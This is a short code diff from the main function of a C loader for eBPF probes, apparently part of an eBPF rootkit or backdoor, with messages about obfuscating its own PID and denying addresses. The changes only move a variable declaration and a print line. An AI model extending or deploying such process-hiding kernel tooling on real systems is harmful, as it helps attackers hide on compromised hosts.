@@ -211,15 +211,16 @@ int main(int argc, char **argv) {
   asciiheader();
   rootcheck(argc, argv);
   boopprintf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");
-  boopprintf("  -> Obfuscating PID: %s\n", pid);
 
   int loaded, err;
   struct bpf_object *bpobj;
   struct pr0be_safe *sfobj;
-  struct pr0be_xdp  *xdpobj;
+  struct bpf_object  *xdpobj;
   struct bpf_program *program = NULL;
   struct bpf_program *xdpprog = NULL;
   struct ring_buffer *rb = NULL;
+  char pid[MAXPIDLEN];
+
 
 
   // ===========================================================================
@@ -263,7 +264,6 @@ int main(int argc, char **argv) {
   {
     boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
     sfobj = pr0be_safe__open();
-    char pid[MAXPIDLEN];
     // getpid()
     //
     // Note: We know that we can use getpid() as the rootcheck() function above
@@ -369,6 +369,8 @@ int main(int argc, char **argv) {
   for (int i = 0; i < cfg.denyc; i++) {
     boopprintf("   X Deny address: %s\n", cfg.deny[i]);
   }
+  boopprintf("  -> Obfuscating PID: %s\n", pid);
+
 
 
   // ===========================================================================
